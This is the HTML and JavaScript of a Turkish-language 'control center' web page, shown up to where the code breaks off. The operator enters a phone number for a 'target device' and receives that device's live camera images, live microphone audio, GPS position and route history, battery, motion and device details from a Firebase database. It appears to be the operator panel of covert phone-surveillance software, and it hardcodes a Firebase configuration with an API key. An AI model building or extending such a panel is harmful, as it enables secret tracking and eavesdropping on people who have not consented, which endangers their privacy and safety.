<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kontrol Merkezi</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-card: #1a1a24;
            --border: rgba(255,255,255,0.06);
            --text-primary: #ffffff;
            --text-secondary: #8892b0;
            --accent: #00d4aa;
            --accent-secondary: #00a8ff;
            --danger: #ff4757;
            --warning: #ffa502;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.5;
        }

        /* Layout */
        .app {
            display: grid;
            grid-template-columns: 380px 1fr;
            min-height: 100vh;
        }

        @media (max-width: 1200px) {
            .app { grid-template-columns: 340px 1fr; }
        }

        @media (max-width: 900px) {
            .app {
                grid-template-columns: 1fr;
                grid-template-rows: auto 1fr;
            }
        }

        /* Sidebar */
        .sidebar {
            background: var(--bg-secondary);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        @media (max-width: 900px) {
            .sidebar {
                max-height: 50vh;
                overflow-y: auto;
            }
        }

        /* Header */
        .sidebar-header {
            padding: 20px;
            border-bottom: 1px solid var(--border);
        }

        .connect-section {
            display: flex;
            gap: 10px;
        }

        .connect-input {
            flex: 1;
            padding: 14px 16px;
            background: var(--bg-primary);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 1rem;
            letter-spacing: 1px;
        }

        .connect-input:focus {
            outline: none;
            border-color: var(--accent);
        }

        .connect-input::placeholder { color: var(--text-secondary); }

        .btn-connect {
            padding: 14px 24px;
            background: linear-gradient(135deg, var(--accent), var(--accent-secondary));
            border: none;
            border-radius: 10px;
            color: var(--bg-primary);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
        }

        .btn-connect:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(0, 212, 170, 0.3);
        }

        /* Status Card */
        .status-card {
            margin: 16px 20px;
            padding: 16px;
            background: var(--bg-card);
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .status-dot {
            width: 14px; height: 14px;
            border-radius: 50%;
            background: #333;
            flex-shrink: 0;
        }

        .status-dot.online {
            background: var(--accent);
            box-shadow: 0 0 15px var(--accent);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 15px var(--accent); }
            50% { box-shadow: 0 0 25px var(--accent); }
        }

        .status-info { flex: 1; }
        .status-info h3 { font-size: 0.95rem; font-weight: 600; }
        .status-info p { font-size: 0.8rem; color: var(--text-secondary); }

        .status-badges {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .badge {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.7rem;
            font-weight: 600;
        }

        .badge-success { background: rgba(0, 212, 170, 0.15); color: var(--accent); }
        .badge-warning { background: rgba(255, 165, 2, 0.15); color: var(--warning); }
        .badge-danger { background: rgba(255, 71, 87, 0.15); color: var(--danger); }

        /* Tabs */
        .tabs {
            display: flex;
            padding: 0 20px;
            border-bottom: 1px solid var(--border);
            overflow-x: auto;
        }

        .tab {
            padding: 14px 16px;
            font-size: 0.85rem;
            color: var(--text-secondary);
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.2s;
            white-space: nowrap;
        }

        .tab:hover { color: var(--text-primary); }
        .tab.active {
            color: var(--accent);
            border-bottom-color: var(--accent);
        }

        /* Tab Content */
        .tab-content {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px;
        }

        .tab-pane { display: none; }
        .tab-pane.active { display: block; }

        /* Section */
        .section {
            margin-bottom: 20px;
        }

        .section-title {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--accent);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* Camera */
        .camera-container {
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            background: #000;
            aspect-ratio: 4/3;
        }

        .camera-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .camera-placeholder {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #333;
        }

        .camera-placeholder span { font-size: 48px; margin-bottom: 8px; }

        .camera-overlay {
            position: absolute;
            top: 10px;
            left: 10px;
            right: 10px;
            display: flex;
            justify-content: space-between;
        }

        .camera-badge {
            background: rgba(0,0,0,0.7);
            padding: 5px 10px;
            border-radius: 6px;
            font-size: 0.7rem;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .camera-badge.live {
            background: var(--danger);
        }

        .camera-badge.live::before {
            content: '';
            width: 6px; height: 6px;
            background: #fff;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .camera-actions {
            position: absolute;
            bottom: 10px;
            right: 10px;
            display: flex;
            gap: 8px;
        }

        .camera-btn {
            width: 40px; height: 40px;
            background: rgba(255,255,255,0.2);
            border: 2px solid #fff;
            border-radius: 50%;
            color: #fff;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            font-size: 16px;
        }

        .camera-btn:hover { background: #fff; color: #000; }

        /* Audio */
        .audio-card {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
        }

        .audio-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .audio-title {
            font-size: 0.9rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .audio-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .audio-btn {
            width: 48px; height: 48px;
            background: linear-gradient(135deg, var(--accent), var(--accent-secondary));
            border: none;
            border-radius: 50%;
            color: var(--bg-primary);
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .audio-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(0, 212, 170, 0.4);
        }

        .audio-btn.playing { background: var(--danger); }
        .audio-btn:disabled { background: #333; cursor: not-allowed; }

        .audio-meter {
            flex: 1;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
        }

        .audio-meter-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--accent), var(--warning), var(--danger));
            border-radius: 4px;
            transition: width 0.15s;
            width: 0%;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            -webkit-appearance: none;
            background: rgba(255,255,255,0.15);
            border-radius: 2px;
        }

        .volume-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 14px; height: 14px;
            background: var(--accent);
            border-radius: 50%;
            cursor: pointer;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }

        .stats-grid.cols-3 { grid-template-columns: repeat(3, 1fr); }
        .stats-grid.cols-4 { grid-template-columns: repeat(4, 1fr); }

        @media (max-width: 400px) {
            .stats-grid.cols-3, .stats-grid.cols-4 {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .stat-card {
            background: var(--bg-card);
            border-radius: 10px;
            padding: 14px;
            text-align: center;
        }

        .stat-card.highlight {
            background: linear-gradient(135deg, rgba(0, 212, 170, 0.1), rgba(0, 168, 255, 0.1));
            border: 1px solid rgba(0, 212, 170, 0.2);
        }

        .stat-label {
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-secondary);
            margin-bottom: 4px;
        }

        .stat-value {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--accent);
            font-family: 'SF Mono', monospace;
        }

        .stat-value.large { font-size: 1.5rem; }

        .stat-unit {
            font-size: 0.65rem;
            color: var(--text-secondary);
        }

        /* Device Info */
        .device-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }

        .device-item {
            background: var(--bg-card);
            border-radius: 10px;
            padding: 12px;
        }

        .device-item label {
            display: block;
            font-size: 0.65rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            margin-bottom: 4px;
        }

        .device-item span {
            font-size: 0.85rem;
            color: var(--text-primary);
        }

        /* History */
        .history-list {
            max-height: 200px;
            overflow-y: auto;
        }

        .history-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 12px;
            background: var(--bg-card);
            border-radius: 8px;
            margin-bottom: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .history-item:hover { background: rgba(0, 212, 170, 0.1); }

        .history-time {
            font-family: monospace;
            font-size: 0.8rem;
            color: var(--accent);
        }

        .history-coords {
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        /* Main - Map */
        .main {
            position: relative;
            background: var(--bg-primary);
        }

        #map {
            width: 100%;
            height: 100%;
            min-height: 400px;
        }

        @media (max-width: 900px) {
            #map { min-height: 50vh; }
        }

        /* Map Overlay */
        .map-overlay {
            position: absolute;
            inset: 0;
            background: rgba(10, 10, 15, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .map-overlay.hidden { display: none; }

        .overlay-content {
            text-align: center;
            padding: 24px;
            max-width: 400px;
        }

        .overlay-icon {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, var(--accent), var(--accent-secondary));
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .overlay-content h2 { font-size: 1.3rem; margin-bottom: 10px; }
        .overlay-content p { color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7; }

        /* Map Controls */
        .map-controls {
            position: absolute;
            top: 16px;
            right: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            z-index: 500;
        }

        .map-btn {
            width: 44px; height: 44px;
            background: rgba(255,255,255,0.95);
            border: none;
            border-radius: 10px;
            color: #333;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }

        .map-btn:hover { background: var(--accent); color: #fff; }
        .map-btn.active { background: var(--accent); color: #fff; }

        /* Layer Selector */
        .layer-selector {
            position: absolute;
            top: 16px;
            left: 16px;
            z-index: 500;
        }

        .layer-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 16px;
            background: rgba(255,255,255,0.95);
            border: none;
            border-radius: 10px;
            color: #333;
            font-size: 0.85rem;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }

        .layer-dropdown {
            position: absolute;
            top: 100%;
            left: 0;
            margin-top: 8px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            overflow: hidden;
            display: none;
            min-width: 180px;
        }

        .layer-dropdown.show { display: block; }

        .layer-option {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            cursor: pointer;
            color: #333;
            font-size: 0.85rem;
            transition: background 0.2s;
        }

        .layer-option:hover { background: #f5f5f7; }
        .layer-option.active { background: rgba(0, 212, 170, 0.1); color: #00a86b; }

        /* Map Info */
        .map-info {
            position: absolute;
            bottom: 16px;
            left: 16px;
            background: rgba(255,255,255,0.95);
            border-radius: 12px;
            padding: 14px 18px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.15);
            z-index: 500;
            min-width: 200px;
        }

        .map-info-title {
            font-size: 0.7rem;
            text-transform: uppercase;
            color: #00a86b;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .map-info-value {
            font-size: 0.9rem;
            color: #333;
            font-weight: 500;
        }

        .map-info-detail {
            font-size: 0.75rem;
            color: #888;
        }

        /* Marker */
        .custom-marker { background: none; border: none; }

        .marker-wrapper {
            width: 50px; height: 50px;
            position: relative;
        }

        .marker-pulse {
            position: absolute;
            width: 50px; height: 50px;
            background: var(--accent);
            border-radius: 50%;
            opacity: 0.3;
            animation: markerPulse 2s infinite;
        }

        @keyframes markerPulse {
            0% { transform: scale(0.5); opacity: 0.5; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        .marker-dot {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 20px; height: 20px;
            background: var(--accent);
            border: 4px solid #fff;
            border-radius: 50%;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }

        /* Leaflet */
        .leaflet-control-attribution { display: none; }
    </style>
</head>
<body>
    <div class="app">
        <aside class="sidebar">
            <div class="sidebar-header">
                <div class="connect-section">
                    <input type="tel" class="connect-input" id="codeInput" placeholder="+90 5XX XXX XX XX">
                    <button class="btn-connect" id="connectBtn">Baƒülan</button>
                </div>
            </div>

            <div class="status-card">
                <div class="status-dot" id="statusDot"></div>
                <div class="status-info">
                    <h3 id="statusText">Baƒülantƒ± Bekleniyor</h3>
                    <p id="statusTime">--:--:--</p>
                </div>
                <div class="status-badges">
                    <span class="badge badge-success" id="batteryBadge">--%</span>
                    <span class="badge badge-success" id="motionBadge">Duraƒüan</span>
                </div>
            </div>

            <div class="tabs">
                <div class="tab active" data-tab="media">üì∑ Medya</div>
                <div class="tab" data-tab="location">üìç Konum</div>
                <div class="tab" data-tab="device">üì± Cihaz</div>
                <div class="tab" data-tab="history">üìã Ge√ßmi≈ü</div>
            </div>

            <div class="tab-content">
                <!-- Media Tab -->
                <div class="tab-pane active" id="tab-media">
                    <div class="section">
                        <div class="section-title">üì∑ Canlƒ± Kamera</div>
                        <div class="camera-container">
                            <img id="cameraImage" src="" alt="" style="display: none;">
                            <div class="camera-placeholder" id="cameraPlaceholder">
                                <span>üì∑</span>
                                <p>Bekleniyor...</p>
                            </div>
                            <div class="camera-overlay">
                                <div class="camera-badge live" id="liveBadge" style="display: none;">CANLI</div>
                                <div class="camera-badge" id="cameraTime">--:--</div>
                            </div>
                            <div class="camera-actions">
                                <button class="camera-btn" id="captureBtn" title="Kaydet">üì∏</button>
                            </div>
                        </div>
                    </div>

                    <div class="audio-card">
                        <div class="audio-header">
                            <div class="audio-title">üé§ Ses Dinleme</div>
                            <span id="audioLevel" style="font-size: 0.8rem; color: var(--text-secondary);">0%</span>
                        </div>
                        <div class="audio-controls">
                            <button class="audio-btn" id="playAudioBtn" disabled>üîä</button>
                            <div class="audio-meter">
                                <div class="audio-meter-fill" id="audioMeter"></div>
                            </div>
                            <input type="range" class="volume-slider" id="volumeSlider" min="0" max="100" value="80">
                        </div>
                    </div>
                </div>

                <!-- Location Tab -->
                <div class="tab-pane" id="tab-location">
                    <div class="section">
                        <div class="section-title">üìç Koordinatlar</div>
                        <div class="stats-grid">
                            <div class="stat-card highlight">
                                <div class="stat-label">Enlem</div>
                                <div class="stat-value" id="latDisplay">--</div>
                            </div>
                            <div class="stat-card highlight">
                                <div class="stat-label">Boylam</div>
                                <div class="stat-value" id="lngDisplay">--</div>
                            </div>
                        </div>
                    </div>

                    <div class="section">
                        <div class="section-title">üìä Hareket Verileri</div>
                        <div class="stats-grid cols-3">
                            <div class="stat-card">
                                <div class="stat-label">Hƒ±z</div>
                                <div class="stat-value large" id="speedDisplay">0</div>
                                <div class="stat-unit">km/s</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">Mesafe</div>
                                <div class="stat-value large" id="distanceDisplay">0</div>
                                <div class="stat-unit">metre</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">Rakƒ±m</div>
                                <div class="stat-value large" id="altDisplay">--</div>
                                <div class="stat-unit">metre</div>
                            </div>
                        </div>
                    </div>

                    <div class="section">
                        <div class="section-title">üéØ Doƒüruluk</div>
                        <div class="stats-grid cols-4">
                            <div class="stat-card">
                                <div class="stat-label">Hassasiyet</div>
                                <div class="stat-value" id="accDisplay">--</div>
                                <div class="stat-unit">metre</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">Y√∂n</div>
                                <div class="stat-value" id="headingDisplay">--</div>
                                <div class="stat-unit">derece</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">G√ºncelleme</div>
                                <div class="stat-value" id="updateDisplay">0</div>
                                <div class="stat-unit">adet</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">Uptime</div>
                                <div class="stat-value" id="uptimeDisplay">0</div>
                                <div class="stat-unit">dakika</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Device Tab -->
                <div class="tab-pane" id="tab-device">
                    <div class="section">
                        <div class="section-title">üîã Pil Durumu</div>
                        <div class="stats-grid">
                            <div class="stat-card highlight">
                                <div class="stat-label">Pil Seviyesi</div>
                                <div class="stat-value large" id="batteryLevel">--%</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">≈ûarj Durumu</div>
                                <div class="stat-value" id="chargingStatus">--</div>
                            </div>
                        </div>
                    </div>

                    <div class="section">
                        <div class="section-title">üì± Cihaz Bilgileri</div>
                        <div class="device-grid">
                            <div class="device-item">
                                <label>Platform</label>
                                <span id="devicePlatform">--</span>
                            </div>
                            <div class="device-item">
                                <label>Tarayƒ±cƒ±</label>
                                <span id="deviceBrowser">--</span>
                            </div>
                            <div class="device-item">
                                <label>Ekran</label>
                                <span id="deviceScreen">--</span>
                            </div>
                            <div class="device-item">
                                <label>Baƒülantƒ±</label>
                                <span id="deviceConnection">--</span>
                            </div>
                            <div class="device-item">
                                <label>Dil</label>
                                <span id="deviceLanguage">--</span>
                            </div>
                            <div class="device-item">
                                <label>Son Sinyal</label>
                                <span id="lastHeartbeat">--</span>
                            </div>
                        </div>
                    </div>

                    <div class="section">
                        <div class="section-title">üèÉ Hareket Sens√∂r√º</div>
                        <div class="stats-grid">
                            <div class="stat-card">
                                <div class="stat-label">Durum</div>
                                <div class="stat-value" id="motionStatus">Duraƒüan</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-label">ƒ∞vme</div>
                                <div class="stat-value" id="motionMagnitude">0</div>
                                <div class="stat-unit">m/s¬≤</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- History Tab -->
                <div class="tab-pane" id="tab-history">
                    <div class="section">
                        <div class="section-title">üìã Konum Ge√ßmi≈üi</div>
                        <div class="history-list" id="historyList">
                            <p style="color: var(--text-secondary); font-size: 0.85rem; text-align: center; padding: 20px;">
                                Hen√ºz konum verisi yok
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </aside>

        <main class="main">
            <div id="map"></div>

            <div class="map-overlay" id="mapOverlay">
                <div class="overlay-content">
                    <div class="overlay-icon">üì±</div>
                    <h2>Baƒülantƒ± Bekleniyor</h2>
                    <p>
                        Telefon numarasƒ±nƒ± girin ve baƒülan butonuna tƒ±klayƒ±n.<br>
                        Hedef cihazda doƒürulama yapƒ±lmƒ±≈ü olmalƒ±dƒ±r.
                    </p>
                </div>
            </div>

            <div class="layer-selector">
                <button class="layer-btn" id="layerBtn">
                    üó∫Ô∏è <span id="currentLayerName">Sokak</span> ‚ñº
                </button>
                <div class="layer-dropdown" id="layerDropdown">
                    <div class="layer-option active" data-layer="street">üó∫Ô∏è Sokak Haritasƒ±</div>
                    <div class="layer-option" data-layer="satellite">üõ∞Ô∏è Uydu</div>
                    <div class="layer-option" data-layer="hybrid">üåç Hibrit</div>
                    <div class="layer-option" data-layer="terrain">‚õ∞Ô∏è Arazi</div>
                    <div class="layer-option" data-layer="dark">üåô Gece</div>
                </div>
            </div>

            <div class="map-controls">
                <button class="map-btn" id="centerBtn" title="Konuma Git">üéØ</button>
                <button class="map-btn" id="zoomInBtn" title="Yakƒ±nla≈ütƒ±r">+</button>
                <button class="map-btn" id="zoomOutBtn" title="Uzakla≈ütƒ±r">‚àí</button>
                <button class="map-btn" id="followBtn" title="Takip Et">üîí</button>
                <button class="map-btn" id="clearBtn" title="Temizle">üóëÔ∏è</button>
            </div>

            <div class="map-info" id="mapInfo" style="display: none;">
                <div class="map-info-title">üìç Son Konum</div>
                <div class="map-info-value" id="mapInfoCoords">--</div>
                <div class="map-info-detail" id="mapInfoTime">--</div>
            </div>
        </main>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDR9gR5nhJ2Y2nNLBKwK7IiAr1_KVWjHSw",
            authDomain: "gizli-38804.firebaseapp.com",
            databaseURL: "https://gizli-38804-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "gizli-38804",
            storageBucket: "gizli-38804.firebasestorage.app",
            messagingSenderId: "653791348128",
            appId: "1:653791348128:web:ac6502b2692441b99610c5"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const mapLayers = {
            street: { url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', options: { maxZoom: 19 } },
            satellite: { url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', options: { maxZoom: 18 } },
            hybrid: { url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', options: { maxZoom: 18 }, overlay: 'https://stamen-tiles-{s}.a.ssl.fastly.net/toner-labels/{z}/{x}/{y}{r}.png' },
            terrain: { url: 'https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png', options: { maxZoom: 17 } },
            dark: { url: 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', options: { maxZoom: 19, subdomains: 'abcd' } }
        };

        class Dashboard {
            constructor() {
                this.map = null;
                this.marker = null;
                this.polyline = null;
                this.currentLayer = null;
                this.overlayLayer = null;
                this.code = '';
                this.isConnected = false;
                this.routePoints = [];
                this.listeners = [];
                this.followMode = false;
                this.audioQueue = [];
                this.isPlaying = false;
                this.volume = 0.8;
                this.currentAudio = null;
                this.lastHeartbeat = null;
                this.startTime = null;

                this.init();
            }

            init() {
                this.initMap();
                this.initTabs();
                this.bindEvents();
                this.formatPhoneInput();

                const saved = localStorage.getItem('dashboard_phone');
                if (saved) document.getElementById('codeInput').value = saved;

                setInterval(() => this.checkHeartbeat(), 5000);
            }

            formatPhoneInput() {
                const input = document.getElementById('codeInput');
                input.addEventListener('input', (e) => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.startsWith('90')) value = value.slice(2);
                    if (value.length > 10) value = value.slice(0, 10);
                    
                    if (value.length > 0) {
                        let formatted = '+90 ';
                        if (value.length > 3) {
                            formatted += value.slice(0, 3) + ' ' + value.slice(3, 6);
                            if (value.length > 6) formatted += ' ' + value.slice(6, 8);
                            if (value.length > 8) formatted += ' ' + value.slice(8);
                        } else {
                            formatted += value;
                        }
                        e.target.value = formatted;
                    }
                });
            }

            initMap() {
                this.map = L.map('map', { center: [39.0, 35.0], zoom: 6, zoomControl: false });
                this.setMapLayer('street');
                this.polyline = L.polyline([], { color: '#00d4aa', weight: 4, opacity: 0.9 }).addTo(this.map);
            }

            setMapLayer(layerName) {
                const layer = mapLayers[layerName];
                if (!layer) return;

                if (this.currentLayer) this.map.removeLayer(this.currentLayer);
                if (this.overlayLayer) { this.map.removeLayer(this.overlayLayer); this.overlayLayer = null; }

                this.currentLayer = L.tileLayer(layer.url, layer.options).addTo(this.map);
                if (layer.overlay) this.overlayLayer = L.tileLayer(layer.overlay, { maxZoom: 18 }).addTo(this.map);

                document.querySelectorAll('.layer-option').forEach(opt => {
                    opt.classList.toggle('active', opt.dataset.layer === layerName);
                });

                const names = { street: 'Sokak', satellite: 'Uydu', hybrid: 'Hibrit', terrain: 'Arazi', dark: 'Gece' };
                document.getElementById('currentLayerName').textContent = names[layerName];
            }

            initTabs() {
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', () => {
                        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
                        tab.classList.add('active');
                        document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
                    });
                });
            }

            bindEvents() {
                document.getElementById('connectBtn').addEventListener('click', () => this.connect());
                document.getElementById('codeInput').addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') this.connect();
                });

                document.getElementById('centerBtn').addEventListener('click', () => this.centerMap());
                document.getElementById('zoomInBtn').addEventListener('click', () => this.map.zoomIn());
                document.getElementById('zoomOutBtn').addEventListener('click', () => this.map.zoomOut());
                document.getElementById('clearBtn').addEventListener('click', () => this.clearRoute());
                document.getElementById('followBtn').addEventListener('click', () => this.toggleFollow());

                document.getElementById('layerBtn').addEventListener('click', () => {
                    document.getElementById('layerDropdown').classList.toggle('show');
                });

                document.querySelectorAll('.layer-option').forEach(opt => {
                    opt.addEventListener('click', () => {
                        this.setMapLayer(opt.dataset.layer);
                        document.getElementById('layerDropdown').classList.remove('show');
                    });
                });

                document.addEventListener('click', (e) => {
                    if (!e.target.closest('.layer-selector')) {
                        document.getElementById('layerDropdown').classList.remove('show');
                    }
                });

                document.getElementById('playAudioBtn').addEventListener('click', () => this.toggleAudio());
                document.getElementById('volumeSlider').addEventListener('input', (e) => {
                    this.volume = e.target.value / 100;
                    if (this.currentAudio) this.currentAudio.volume = this.volume;
                });

                document.getElementById('captureBtn').addEventListener('click', () => this.capturePhoto());
            }

            toggleFollow() {
                this.followMode = !this.followMode;
                document.getElementById('followBtn').classList.toggle('active', this.followMode);
                document.getElementById('followBtn').textContent = this.followMode ? 'üîì' : 'üîí';
            }

            connect() {
                const input = document.getElementById('codeInput').value;
                this.code = input.replace(/\D/g, '');
                if (this.code.startsWith('90')) this.code = this.code.slice(2);

                if (this.code.length < 10) {
                    alert('Ge√ßerli bir telefon numarasƒ± girin.');
                    return;
                }

                localStorage.setItem('dashboard_phone', input);
                this.startTime = Date.now();

                this.listeners.forEach(ref => ref.off());
                this.listeners = [];

                this.listenToDevice();
                document.getElementById('connectBtn').textContent = 'Baƒülanƒ±yor...';
            }

            checkHeartbeat() {
                if (!this.lastHeartbeat) return;
                const seconds = Math.floor((Date.now() - this.lastHeartbeat) / 1000);
                document.getElementById('lastHeartbeat').textContent = seconds + 's √∂nce';
                if (seconds > 60) this.updateConnectionStatus(false);
            }

            listenToDevice() {
                const deviceRef = db.ref('devices/' + this.code);

                const statusRef = deviceRef.child('status');
                statusRef.on('value', (snap) => this.updateConnectionStatus(snap.val() === 'online'));
                this.listeners.push(statusRef);

                const heartbeatRef = deviceRef.child('heartbeat');
                heartbeatRef.on('value', (snap) => {
                    const data = snap.val();
                    if (data) {
                        this.lastHeartbeat = Date.now();
                        if (data.uptime) document.getElementById('uptimeDisplay').textContent = Math.floor(data.uptime / 60);
                    }
                });
                this.listeners.push(heartbeatRef);

                const locRef = deviceRef.child('location');
                locRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateLocation(data); });
                this.listeners.push(locRef);

                const camRef = deviceRef.child('camera');
                camRef.on('value', (snap) => { const data = snap.val(); if (data && data.image) this.updateCamera(data); });
                this.listeners.push(camRef);

                const batRef = deviceRef.child('battery');
                batRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateBattery(data); });
                this.listeners.push(batRef);

                const motionRef = deviceRef.child('motion');
                motionRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateMotion(data); });
                this.listeners.push(motionRef);

                const audioLevelRef = deviceRef.child('audioLevel');
                audioLevelRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateAudioLevel(data); });
                this.listeners.push(audioLevelRef);

                const audioRef = deviceRef.child('audio');
                audioRef.on('value', (snap) => { const data = snap.val(); if (data && data.data) this.handleAudioData(data.data); });
                this.listeners.push(audioRef);

                const deviceInfoRef = deviceRef.child('deviceInfo');
                deviceInfoRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateDeviceInfo(data); });
                this.listeners.push(deviceInfoRef);

                const historyRef = deviceRef.child('history').limitToLast(30);
                historyRef.on('value', (snap) => { const data = snap.val(); if (data) this.updateHistory(data); });
                this.listeners.push(historyRef);
            }

            updateConnectionStatus(online) {
                const dot = document.getElementById('statusDot');
                const text = document.getElementById('statusText');
                const btn = document.getElementById('connectBtn');
                const audioBtn = document.getElementById('playAudioBtn');
                const liveBadge = document.getElementById('liveBadge');

                if (online) {
                    dot.classList.add('online');
                    text.textContent = 'Baƒülƒ±';
                    btn.textContent = 'Baƒülandƒ± ‚úì';
                    audioBtn.disabled = false;
                    liveBadge.style.display = 'flex';
                    document.getElementById('mapOverlay').classList.add('hidden');
                    document.getElementById('mapInfo').style.display = 'block';
                    this.isConnected = true;
                } else {
                    dot.classList.remove('online');
                    text.textContent = '√áevrimdƒ±≈üƒ±';
                    btn.textContent = 'Baƒülan';
                    audioBtn.disabled = true;
                    liveBadge.style.display = 'none';
                    this.isConnected = false;
                }
            }

            updateLocation(data) {
                const { lat, lng, accuracy, speed, altitude, heading, timestamp, updateCount, totalDistance } = data;

                document.getElementById('latDisplay').textContent = lat.toFixed(6);
                document.getElementById('lngDisplay').textContent = lng.toFixed(6);
                document.getElementById('accDisplay').textContent = Math.round(accuracy || 0);
